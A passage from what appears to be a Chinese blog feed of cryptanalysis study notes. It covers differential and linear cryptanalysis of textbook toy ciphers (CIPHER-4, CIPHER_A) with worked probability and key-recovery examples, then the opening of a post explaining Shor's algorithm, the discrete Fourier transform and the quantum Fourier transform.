\tag {inherited\;path}</script><p>由上面的对比可以看到，$better\;path$ 拥有更大的差分特征概率。那么考虑以下，在找到 4 轮差分特征之后，是否有相对于穷举的优势来猜第五轮的密钥$k_5$，很明显，$(\frac{6}{16})^4 &lt;\frac{1}{16}$，也就是噪声大于我们猜测的概率。</p>
<p>这是否意味着差分分析的失败？？（假设上面的$better\;path$ 就是最好的差分特征传播路径）在一定轮数之后就失去了其统计上的意义？？可能差分确实在传递到一定论数之后确实会因为特征概率太小而被噪声淹没，但似乎我们漏掉了一些使概率放大的办法…</p>
<h3 id="DC-with-Differential"><a href="#DC-with-Differential" class="headerlink" title="DC with Differential"></a>DC with Differential</h3><h4 id="Different-path-to-same-destination"><a href="#Different-path-to-same-destination" class="headerlink" title="Different path to same destination"></a>Different path to same destination</h4><p>在我们上面的分析中，计算了每一轮的路径、特征及概率，但对现实使用的密码进行差分分析时，往往不会这样做，因为拿到每一轮的结果过于复杂，往往使用一定工具，如 <a href="https://blog.nowcoder.net/n/fa9ab4fc67614b9388fd8406195cd2e0">MILP</a>，来搜索达到可提供优势的差分路径的最大长度。而该搜索过程也不会考虑中间差分值，仅仅考虑该路径的输入差分和输出差分，中间值都可以为未知，例如对$CIPHER-4$有：</p>
<script type="math/tex; mode=display">
(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}?\stackrel{\mathcal{R_2}}{\rightarrow}?\stackrel{\mathcal{R_3}}{\rightarrow}?\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)

\tag{practice\;path}</script><p>假设我们限制特定的输入输出差分，如都为 $(0,0,2,0)$，那么中间值无论是多少，只要能达到这一点就算做 *优势对*，否则算作 *劣势对*。很自然的想到，经过 4 轮且满足条件：输入差分为$(0,0,2,0)$且输出差分为$(0,0,2,0)$ 的优势对远远不止中间值$better\;path$所示的那些，我们将优势对构成的路径记为 $Adv\;paths$：</p>
<script type="math/tex; mode=display">
(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
*Adv\;path\;_1*\\

(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,0,1)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
*Adv\;path\;_2*\\

(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
*Adv\;path\;_3*\\

(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
*Adv\;path\;_4*</script><p>可以查表$Table\;6.2$可以验证以上$Adv\;paths$，及查询其特征概率，均为$(\frac{6}{16})^4$ ,所以将其特征概率相加得到 $4*(\frac{6}{16})^4=\frac{81}{1024}$ ，而 $\frac{81}{1024} &gt; \frac{1}{16}$，所以，在不考虑路径中间差分值的时候，差分攻击对分析 4 轮 $CIPHER-4$，来猜测第五轮密钥 $k_5$ 时是有一定优势的。在实践的差分分析中，我们往往也是采用这种办法。</p>
<p>同样的，类似 $ Fig.\;6.7$ 的描述方式如下：明显的，忽略了中间差分值，使优势对的数量提升了，这对应差分特征概率的提升。</p>
<center>
    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650442831543/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center>

<h4 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h4><p>所谓差分密码分析，即识别发生差异的统计特性异常分布，产生比被我们称作噪声的枚举概率更高的猜测概率，从而使我们在猜测时，正确的数据能够从海量的数据中凸显出来，而非被其淹没。</p>
<p>在前面已经介绍了将差分特征概率尽量提高的办法（当然还会有其他更有效的办法），那现在该把关注点放在猜测密钥上。</p>
<p>回顾下前面整个过程：</p>
<ol>
<li>建$DDT$表并通过密码结果找出最佳差分路径，记录每一轮都满足差分路径的*数据*（明文1：密文1，明文2：密文2 为一对），例子中大概有1296对；</li>
<li>只考虑输入差分和输出差分，而不需要在每一轮都满足差分路径以提高差分特征概率，将同时满足输入差分和输出差分的数据记录下来，例子中大概有 5310 对；</li>
<li>枚举所有密文（全空间）因为寻找的差分路径是在一定概率下成立的，所有需要枚举所有密文，才能利用到差分提供的优势（才能达到使正确密钥凸显出的数据量）</li>
</ol>
<p>按照这个过程，我们将在最后一轮对每个密文，如果密码设计足够好的话会有 $2^{16}=65536$ 个，考虑对的话就是 $A^2_{65536}$，这将是很庞大的数据量，且对每一对密文都需要枚举 $2^{16}$ 个密钥，与构造的区分器进行对比。显然，虽然我们通过忽略中间差分路径取值来提高了特征概率，但在枚举猜密钥的过程中仍然需要很高的复杂度。</p>
<p>所有，需要考虑将密文对筛掉一些，只留下满足条件的密文对，在第四轮之后，得到的差分值为$(0,0,2,0)$，通过查表 $Table\;6.2$ 可得，该差分经过一次 $S[·]$ 得到的值可能为 $(0,0,h,0)$ 其中 $h\in{\{1,2,9,a\}}$，而最后一轮没有 $P[·]$ ，那么对所有密文，我们需要留下的仅仅是满足条件：</p>
<ol>
<li><p>输入差分为$(0,0,2,0)$的明文加密所得；</p>
</li>
<li><p>在 1. 的基础上，将差分的第 0，1，3 半字节位不为全零，且第 2 半字节位不等于 ${\{1,2,9,a\}}$ 的密文对筛掉。</p>
</li>
</ol>
<p>将所以符合上述条件的密文对记录下来，上述例子中大概有 7387 对，也就是说我们仅仅需要对 7387 个密文对，枚举所有可能的最后一轮密钥，这就将数据量降下来很多，同时，找到正确密钥的概率变为 $\frac{5310}{7387} \approx 70\%$  ,使用未经过筛选的密文对猜密钥，得到正确的概率是 $\frac{5310}{56636} \approx 8\%$，可见，筛选给猜密钥提供了很大的优势。书中给出的解释：</p>
<p><center>
    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650456161985/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center></p>
<h4 id="Key-Recovery"><a href="#Key-Recovery" class="headerlink" title="Key Recovery"></a>Key Recovery</h4><p>在 4 轮之后，差分传递的特征及其概率如下：</p>
<script type="math/tex; mode=display">
(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}?\stackrel{\mathcal{R_2}}{\rightarrow}?\stackrel{\mathcal{R_3}}{\rightarrow}?\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)
\tag{practice\;path}</script><p>概率为 $\frac{5310}{65536} \approx(\frac{6}{16})^4\approx0.08$，而筛选之后剩余的对的概率为 $\frac{7387}{65536} \approx0.11$，筛选出的对中可以用来求出正确密钥的对的比率为 $\frac{5310}{7387}\approx0.7$.那么，给出一个例子，如果我们有总共 $t$ 个对，筛选后留下的对为 $t\times0.11$ 个，可能满足条件的对为 $t\times0.08$ 个。比如 $t=500$ ，则会筛选出 $55$ 个满足差分特征的对，其中有 $40$ 个是由正确的最后一轮密钥加密所得，$15$ 个为无用对。为什么会有一部分无用对留下？我们筛选留下的是明文差分且密文差分都满足条件的对，而在密文位置满足差分特征的对往回推并不一定能够得到区分器末尾（例子第四轮后）的差分值。</p>
<p><center>
    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650463751096/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
</center><br>简单陈述这个过程存在的缺陷：</p>
<ol>
<li><p>我们只能通过对比，确切的猜出不为零的第 2 个半字节位，即 4 个 $bits$，记作目标比特 $target\;bits$ ，但其他 3 个半字节位由于没有穷尽所有可能的结果，所有无法确定其值。这并未达到分析的目的，甚至连一轮密钥都没有获取到。需要恢复更多 $bits $，需要重复该过程来恢复全 $bits$ 的密钥。</p>
</li>
<li><p>每次只能恢复一轮的密钥，想要恢复更多轮，可能需要更多次的重复上述过程，或者根据密钥编排算法来推所有密钥。（往往是拿到足够多轮次的密钥之后再根据密钥编排算法推）</p>
</li>
</ol>
<p>*差分分析中，获得了一部分密钥 $bits$ 之后，会大大提高恢复其余更多 $bits$ 的难度。</p>
<script type="math/tex; mode=display">
The\;end</script>]]></content>
      <categories>
        <category>Cryptanalysis</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Linear Cryptanalysis</title>
    <url>/2022/05/25/Cryptanalysis/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>线性分析通过寻找明密文与密钥间的线性相关性，构造可能产生线性偏差的掩码（搜索）来构造尽量大的线性逼近，从而逐比特的获取密钥信息。</p>
<p>$Example\ 1$</p>
<p>最简单的例子：$plaintext\ m,\ ciphertext\ c,\ key\ k = b\ bits$ ，密码系统 $c = m \oplus k$ ，显然该密码系统在不是一次一密的情况下是不安全的，但现在从另一个方面考虑：</p>
<p>如果逐比特考虑这该密码系统的 3 个变量，则对应比特也满足关系 $c_i = m_i \oplus k_i$ ，$_i$ 表示对应的比特位。那么对于已知明文攻击，就可以通过 $k_i = m_i \oplus c_i$ 来计算获得 $k_i$ 的每一个比特，并还原成 $k$ .这是一种通过明密文的线性关系来逐比特恢复密钥的一个最简单实例，但其并没有较强的说服力.</p>
<p>$Example\ 2$</p>
<p>考虑一个稍微复杂的加密系统，密文比特由部分明文比特和密钥比特确定：同样可以通过直接逐比特的写出明密文与密钥的关系来恢复密钥</p>
<script type="math/tex; mode=display">
\begin{aligned}
c_{3} &=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0} \\
c_{2} &=m_{2} \oplus m_{0} \oplus k_{2} \oplus k_{0} \\
c_{1} &=m_{3} \oplus m_{2} \oplus k_{3} \oplus k_{2}, \text { and } \\
c_{0} &=m_{1} \oplus m_{0} \oplus k_{1} \oplus k_{0}\\
i.e.\\
k_{0} &=m_{0} \oplus c_{0} \oplus c_{3} \\
k_{1} &=m_{1} \oplus c_{0} \oplus c_{2} \oplus c_{3} \\
k_{2} &=m_{2} \oplus c_{1} \oplus c_{1} \oplus c_{2}, \text { and } \\
k_{3} &=m_{3} \oplus c_{0} \oplus c_{1} \oplus c_{2} \oplus c_{3}
\end{aligned}\\</script><h2 id="CIPHER-A："><a href="#CIPHER-A：" class="headerlink" title="CIPHER_A："></a>CIPHER_A：</h2><p>现在考虑密码系统 CIPHER_A：其中变量均为 4 bits，密钥 8 bits，记为 $k_0||k_1$ ，</p>
<p><img src="https://ossimg.yzitc.com/2022/05/23/20c5c34e70f97.png"></p>
<p>该密码系统满足如下关系：$u=m \oplus k_{0}, v=S[u] \text {, and } c=v \oplus k_{1} \text {. }$ 现在需要找到合适的密钥使得 $v=S[u]$ ，试图通过逐比特的恢复密钥，如何能够逐比特的考虑明密文及密钥？将其都做为列向量来考虑，并且用一个行向量来当作<strong>掩码</strong>，表示取或不取该比特：</p>
<script type="math/tex; mode=display">
(1,0,0,0) \times\left(\begin{array}{c}
m_{3} \\
m_{2} \\
m_{1} \\
m_{0}
\end{array}\right)=m_{3} \text {, and }(0,0,1,0) \times\left(\begin{array}{c}
m_{3} \\
m_{2} \\
m_{1} \\
m_{0}
\end{array}\right)=m_{1}</script><p>那么上述的 $Example\ 2$ 就可以表示为：（掩码随机取的，× 表示数量积）</p>
<script type="math/tex; mode=display">
(1,0,1,1) \times\left(\begin{array}{l}
m_{3} \\
m_{2} \\
m_{1} \\
m_{0}
\end{array}\right) \oplus(1,0,1,1) \times\left(\begin{array}{l}
k_{3} \\
k_{2} \\
k_{1} \\
k_{0} \\
\end{array}\right)=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
i.e.\ \ \ c_{3}=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
i.e.\ \ \ \alpha \cdot c=\beta \cdot m \oplus \beta \cdot k\ \ where\ \alpha=(1,0,0,0) \text { and } \beta=(1,0,1,1)</script><p>也即，可以通过掩码表示明密文相应位和密钥的线性关系（或进行一定的线性变化），掩码为 $\alpha\ and\ \beta$ . 但是仅仅线性的关系对上图的 CIPHER_A 是没有用的，因为存在非线性的 S-box，所以自然的考虑能否通过统计特性，使其逼近该密码系统中的非线性函数，即 S-box ？关系为 $\alpha \cdot x = \beta \cdot S[x]$（注意这里的结果是 0 或 1） 对于一个理想的非线性函数，无论使用任何掩码，该关系满足与否的概率为 $1/2$ ，那又很自然的想到，希望通过穷搜所有掩码来使关系满足的概率偏离 $1/2$ ，即存在<strong>偏差</strong> 。</p>
<p>以上密码使用掩码表示，并计算其已知偏差：</p>
<script type="math/tex; mode=display">
\begin{array}{l}
(\alpha \cdot m)=\left(\alpha \cdot k_{0}\right) \oplus(\alpha \cdot u) \text { with probability } 1\\
(\alpha \cdot u)=(\beta \cdot v) \quad \text { with probability } p\\
(\beta \cdot v)=\left(\beta \cdot k_{1}\right) \oplus(\beta \cdot c) \text { with probability } 1 .
\end{array}</script><p>只需要考虑中间的式子，进一步，将左边式子和右边式子相乘得到关于明密文及密钥的（化简过）（掩码位）关系式：</p>
<script type="math/tex; mode=display">
(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right) \text { with probability } p \text {. }</script><p>也就是，在直到明密文对的情况下，找到  $\alpha \cdot x = \beta \cdot S[x]$ 关系式的相关信息，就能获得关于密钥的信息。</p>
<p>如果 $p \ne 1/2$ 即存在偏差，那么就有可能在一定的数据量内获得关于密钥的信息，假设 $p = 1/2 + \varepsilon$ ，则 $0&lt;|\boldsymbol{\varepsilon}| \leq \frac{1}{2}$ 为线性偏差，当然会期望偏差尽量大，因为偏差越大就需要越少的数据量。 </p>
<p>举例对上述非线性关系式  $\alpha \cdot x = \beta \cdot S[x]$ 的简单线性攻击（这里的 x 满足上述 CIPHER_A的 u 或 v)：</p>
<p><strong>建立区分器</strong></p>
<ol>
<li>穷举所有 $x$ ，并计算 $S[x]$ ;</li>
<li>对所有的 $x\ and\ S[x]$ 穷举所有掩码 $\alpha\ and\ \beta$ ；</li>
<li>算出 $\alpha \cdot x = \beta \cdot S[x]$ 的概率（或 $\alpha \cdot x \oplus 1= \beta \cdot S[x]$ 的概率）； </li>
</ol>
<p>例子：$p(\alpha \cdot x = \beta \cdot S[x]) = 2/16\ \ and\ \ p(\alpha \cdot x \oplus 1= \beta \cdot S[x]) = 14/16$ </p>
<p>$i.e.\ \ \ \  p((\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right))=14/16$ </p>
<script type="math/tex; mode=display">
\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)</script><script type="math/tex; mode=display">
\begin{array}{|c|cccccccccccccccc|}
\hline \mathrm{x} & 0 & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 & 9 & \mathrm{a} & \mathrm{b} & \mathrm{c} & \mathrm{d} & \mathrm{e} & \mathrm{f} \\
\hline \mathrm{S}[\mathrm{x}] & \mathrm{f} & \mathrm{e} & \mathrm{b} & \mathrm{c} & 6 & \mathrm{~d} & 7 & 8 & 0 & 3 & 9 & \mathrm{a} & 4 & 2 & 1 & 5 \\
\hline \hline \alpha \cdot x & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 0 \\
\hline \beta \cdot S[x] & 1 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 0 \\
\hline
\end{array}</script><p>为了表述清楚：二元域内的运算和比较（module 2）</p>
<script type="math/tex; mode=display">
\alpha \cdot x = \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{2}{16}</script><script type="math/tex; mode=display">
\alpha \cdot x \ne \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{14}{16}</script><p><strong>恢复密钥</strong></p>
<ol>
<li><p>设置计数器 $T_0\ and\ T_1$ ，固定掩码 $\alpha\ and\ \beta$ ，使用多对明密文进行测试，计算 $(\alpha \cdot m) \oplus (\beta \cdot c)$ ：</p>
<p>为 1 ，$T_1$ 计数器＋1</p>
<p>为 0 ，$T_0$ 计数器 + 1</p>
<p>（注意这里使用的明密文对数量和偏差的大小有关）</p>
</li>
<li><p>可以先假设密钥值，观察两个计数器，可以获得 $(\alpha \cdot m) \oplus (\beta \cdot c)$ 的值（ 0 或 1）的分布，再根据相等与否的概率得出密钥信息 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0\ or\ 1$ </p>
<p>注意，并不能确定的获取密钥在该位的取值，只是获取掩码对应的几位之间的信息。</p>
</li>
</ol>
<p>例子：</p>
<blockquote>
<ol>
<li><p>固定掩码 $\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)\$ ;</p>
</li>
<li><p>假设关系式 $(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)$ 成立的概率位 $2/16$，则不成立概率 $14/16$ ；</p>
</li>
<li><p>假设，密钥关系 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 对 N 个明密文对计算  $(\alpha \cdot m) \oplus (\beta \cdot c)$ ，将预计得到 $2N/16$ 个 1 和  $14N/16$ 个 0，即 $T_0 = \frac{2N}{16}\ and\ T_1 = \frac{14N}{16}$ </p>
</li>
<li><p>如果 3. 的计数器满足上面所述，则可以猜测  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 是正确的，否则，其是错误的，也就是  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0$ （这种情况 $T_0$ 和 $T_1$ 的计数应该差不多和 3. 相反）；</p>
</li>
<li>如果 3. 的计数器满足上述，就可获得密钥信息  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1\ \ i.e.\ \ k_{0,0}\oplus k_{0,3} \oplus k_{1,2} = 1$ ；</li>
<li>继续寻找更多关系来尽可能多的恢复密钥比特。</li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>Cryptanalysis</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Shor`s Algorithm</title>
    <url>/2022/06/11/Cryptanalysis/Shor%20%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="Shor-算法"><a href="#Shor-算法" class="headerlink" title="Shor 算法"></a>Shor 算法</h1><h2 id="RSA-公钥加密算法"><a href="#RSA-公钥加密算法" class="headerlink" title="RSA 公钥加密算法"></a>RSA 公钥加密算法</h2><p>RSA(Rivest–Shamir–Adleman) 是基于大因数分解的困难问题，即获取两个大因数的乘积很简单，但通过乘积分解得到两个大因数十分困难。具体过程如下：(更具体的说，对于 768 位的整数，分解它需要花费数百台计算机使用两年的时间不断计算 [2009年的数据]，而现在使用的是 2048 位的整数 (RSA-2048) )</p>
<center>
    <img src="https://img-blog.csdnimg.cn/2021070910564256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjcwNDQ0,size_16,color_FFFFFF,t_70" alt="img" style="zoom:80%;" />
    <img src="https://ossimg.yzitc.com/2022/06/08/53d574e2ab159.png" width=86%>
</center>

<p>而 1994 年，Peter Shor 发现了 Shor 算法，能够在多项式时间内实现大整数分解。</p>
<hr>
<h2 id="大数因数分解算法"><a href="#大数因数分解算法" class="headerlink" title="大数因数分解算法"></a>大数因数分解算法</h2><p>目的是将一个大数 $N$ 分解为两个质因子 $P, Q$ 的乘积。步骤：</p>
<blockquote>
<ol>
<li>随机寻找一个数 $a&lt;N$ ；</li>
<li>计算 $gcd(a,N)$ ，如果 $gcd(a,N) \ne 1$ ，就得到了一个非平凡因子，提前结束了该算法，即可以对 $N$ 进行因数分解；如果 $gcd(a,N)=1$ 执行步骤 3；</li>
<li><strong>[CORE]</strong>计算函数 $f(x)=a^xmodN$ 的周期 $r$ 使 $f(x+r)=f(x)$（找出 $a$ 在 $Z_N$ 里的阶）；</li>
<li>如果 $r$ 是奇数，或 $a^{r/2} \equiv -1(modN)$ 则返回步骤 1. 重新寻找随机的 $a$ ；</li>
<li>否则，$r$ 为寻找到的所需的周期，且 $gcd(a^{r/2}+1,N)$ 和  $gcd(a^{r/2}-1,N)$ 至少有一个是 $N$ 的非平凡因子，也就完成了大数的因数分解。</li>
</ol>
</blockquote>
<p>上述过程中，步骤 3. 是核心，通过经典的方法计算周期 $r$ 可能需要消耗很多资源，所以需要后面的量子层面的加速，先对上述过程举一个小例子，便于理解：</p>
<blockquote>
<p>假设 $N=15,\ (P<em>Q=5</em>3)\$ ，尝试对 15 进行因数分解</p>
<ol>
<li><p>随机选择比 15 小的整数，比如 $a=7$ ,$gcd(7,15)=1$</p>
</li>
<li><p>计算函数  $f(x)=a^xmodN$ 的周期，遍历 $x=0,1,2,3…$  得到以下结果</p>
<script type="math/tex; mode=display">
7^{0} \bmod 15,7^{1} \bmod 15,7^{2} \bmod 15,7^{3} \bmod 15 ,\\  7^{4} \bmod 15,7^{5} \bmod 15,7^{6} \bmod 15,7^{7} \bmod 15, \ldots\\   =1,7,4,13,1,7,4,13, \ldots</script><p>可以发现， $f(x+4)=f(x)$ 即 $r=4$ 为周期</p>
</li>
<li><p>$r$ 不是奇数，计算 $7^{4/2}=49=4\ne-1(mod15)$  ，所以求得的 $r$ 可用；</p>
</li>
<li><p>计算  $gcd(7^{4/2}+1,15)=5$，  $gcd(7^{4/2}-1,15)=3$，刚好这两个因子为整数 $N$ 的两个因子。</p>
</li>
</ol>
</blockquote>
<p>上述过程将大数因数分解问题转化为寻找周期问题，问题得到了简化，但一般(RSA-2048)的周期都非常大，经典计算机往往没有足够的运算力能够达到穷举得到周期，即使<strong>生日悖论</strong>将碰撞的产生需要的数据量进行了开方。</p>
<p>在此，将周期查找 <strong>[CORE]</strong> 步骤3. 记为周期查找程序 (Period-finding subroutine)</p>
<hr>
<h2 id="离散傅里叶变换（DFT）"><a href="#离散傅里叶变换（DFT）" class="headerlink" title="离散傅里叶变换（DFT）"></a>离散傅里叶变换（DFT）</h2><p>自然界存在的波可以使用<strong>傅里叶级数展开</strong>将其转换为有限或无限个正弦波的线性组合</p>
<h4 id="sup-时域与频域"><a href="#sup-时域与频域" class="headerlink" title="sup_时域与频域"></a>sup_时域与频域</h4><p>Re: <a href="https://zhuanlan.zhihu.com/p/428783752">时域、频域、空间域的基本概念</a></p>
<ol>
<li>时域 (Time Domine)：</li>
</ol>
<blockquote>
<p>自变量：<strong>时间 t</strong>；因变量：<strong>振幅 V</strong> ；</p>
<p>时域图反映的是振幅随时间变化的关系，<strong>频率 f</strong> =6Hz （在 1s 内发生 6 次完整周期震动）</p>
<p><img src="https://pic4.zhimg.com/80/v2-8138e1790aa30fd0e1f4b33fccb01dd3_720w.jpg" alt="img"></p>
</blockquote>
<ol>
<li>频域 (Frequency Domine)</li>
</ol>
<blockquote>
<p>自变量：<strong>频率 f</strong>； 因变量：<strong>幅度 V</strong>；</p>
<p>频域图反映的是振幅随频率变化的关系，因为上面波形只是一个正弦波， 其频率是 6 Hz，所有转换到频域图上就只在 6 Hz 处有振幅。（如果波形是多个频率波的叠加，在频域图上就能看到在多个频率处对应有振幅）</p>
<p><img src="https://pic1.zhimg.com/80/v2-87762c725eda4641c018a59650219f8c_720w.jpg" alt="img"></p>
</blockquote>
<ol>
<li><p>频域与时域的关系（浅层理解）</p>
<p>用下面这张图来看非常直观：（尝试在多个波形叠加的情况下理解）</p>
<p>时域图表示在一定时间内（可能是无限的时间）波的振幅随时间的变化，而多个波的叠加（增强或抵消）使我们无法直观的看出波的频率，使用<strong>傅里叶变换</strong>，拉普拉斯变换之类的转换方法将波转换到频域图上，就可以清晰的分辨出波的频率和最大振幅。</p>
<p><img src="https://pic2.zhimg.com/80/v2-f88da3baeff0d8b3327c2b2623322bd1_720w.jpg" alt="img"></p>
</li>
</ol>
<hr>
<h4 id="sup-傅里叶级数："><a href="#sup-傅里叶级数：" class="headerlink" title="sup_傅里叶级数："></a>sup_傅里叶级数：</h4><blockquote>
<p><strong>任何周期信号都可以化简为正弦信号或余弦信号的和</strong> —— Fourier</p>
</blockquote>
<p>傅里叶级数的三种表示方法：</p>
<blockquote>
<ol>
<li>三角函数表示：由于 $sin$ 和 $cos$ 可以相互转换，所有这两种表示方式可以通过三角函数的转换化为相同</li>
</ol>
</blockquote>
<script type="math/tex; mode=display">
\begin{aligned}
f(t) &=\sum_{n=0}^{\infty} A_{n} \sin \left(n \omega_{0} t+\theta_{n}\right)
\\
f(t) &=\frac{a_{0}}{2}+\sum_{n=1}^{\infty} a_{n} \sin \left(n \omega_{0} t\right)+b_{n} \cos \left(n \omega_{0} t\right)
\end{aligned}</script><blockquote>
<ol>
<li>复指数表示：</li>
</ol>
</blockquote>
<script type="math/tex; mode=display">
f(t)=\sum_{n=-\infty}^{+\infty} c_{n} e^{i n \omega_{0} t}, \quad c_{n}=\frac{1}{T} \int_{0}^{T} f(t) e^{-i n \omega_{0} t} d t, \omega_{0}=\frac{2 \pi}{T}</script><p>傅里叶级数推导 <a href="https://www.zhihu.com/column/c_1060594486161293312">深入理解傅立叶变换</a> , <a href="https://zhuanlan.zhihu.com/p/41455378">傅里叶系列（一）傅里叶级数的推导</a> </p>
<hr>
<h4 id="CORE-离散傅里叶变换（DFT）："><a href="#CORE-离散傅里叶变换（DFT）：" class="headerlink" title="CORE_离散傅里叶变换（DFT）："></a>CORE_离散傅里叶变换（DFT）：</h4><p>傅里叶变换实现信号从时域到频域的表示，从上面可以看出，在频域上表示的信号比在时域上表示的更加直观；</p>
<font color=red>离散傅里叶变换</font>作用于离散数据集，$x_j$ ，$j = 0,1,...,N-1$ ：

$$
y_{k}=\frac{1}{\sqrt{N}} \sum_{j=0}^{N-1} x_{j} \mathrm{e}^{2 \pi i j k / N}
$$

解释：

<br>

$j,k$ 是从 $0\ to\ N-1$ 的索引，$i$ 是复数 $\sqrt{-1} $ ；

$j=0,1,...,N-1\ \ \longrightarrow\ \ x_j\ are\ complex\ numbers$ 

$k=0,1,...,N-1\ \ \longrightarrow\ \ y_k\ are\ complex\ numbers$ 

<br>

例子：

数据集：$x_{j}=\{1,3\}\ i.e.\ x_0 = 1,x_1 = 3\ \ ,N=2$
$$
For\  k=0,\ y_{0}=\frac{1}{\sqrt{2}} \sum_{j=0}^{1} x_{j} \mathrm{e}^{2 \pi i j * 0 / 2}=\frac{1}{\sqrt{2}}(1+3)=\frac{4}{\sqrt{2}} \\

For\  k=1,\ y_{1}=\frac{1}{\sqrt{2}} \sum_{j=0}^{1} x_{j} \mathrm{e}^{2 \pi i j * 1 / 2}=\frac{1}{\sqrt{2}}\left(1+3 \mathrm{e}^{\pi i}\right)=-\frac{2}{\sqrt{2}}
$$
$k=1$ 时，使用了<font color=red>欧拉公式：</font>
$$
e^{i x}=\cos x+i \sin x
$$

---

<br>

## 量子傅里叶变换（QFT）


一个量子态经过 Hadamard 门变换成均匀的量子态，可以写作：
$$
|\psi\rangle=\sum_{j=0}^{N-1} \alpha_{j}|j\rangle \rightarrow\left(\begin{array}{c}
\alpha_{0} \\
\cdot \\
\cdot \\
\cdot \\
\alpha_{N-1}
\end{array}\right)
$$
其中，$\alpha_j$ 表示幅度，$|j>$ 表示均匀产生的叠加态，可以写作右边的 $N$ 维列向量形式；

经过量子傅里叶变换，幅度会发生改变：
$$
\left|\psi^{\prime}\right\rangle=\mathrm{QFT}_{N}|\psi\rangle=\sum_{k=0}^{N-1} \beta_{k}|k\rangle \rightarrow\left(\begin{array}{c}
\beta_{0} \\
\cdot \\
\cdot \\
\cdot \\
\beta_{N-1}
\end{array}\right)
$$
其中，每个<font color=red>幅度</font>为 $\beta_{k}=\frac{1}{\sqrt{N}} \sum_{j=0}^{N-1} \alpha_{j} \mathrm{e}^{2 \pi i j k / N}$

例子：$n=2\ \ i.e.\ N=2^2=4$  ，所以， $|\psi\rangle=\alpha_{0}|00\rangle+\alpha_{1}|01\rangle+\alpha_{2}|10\rangle+\alpha_{3}|11\rangle$ 经过 $QFT$ 变换：
$$
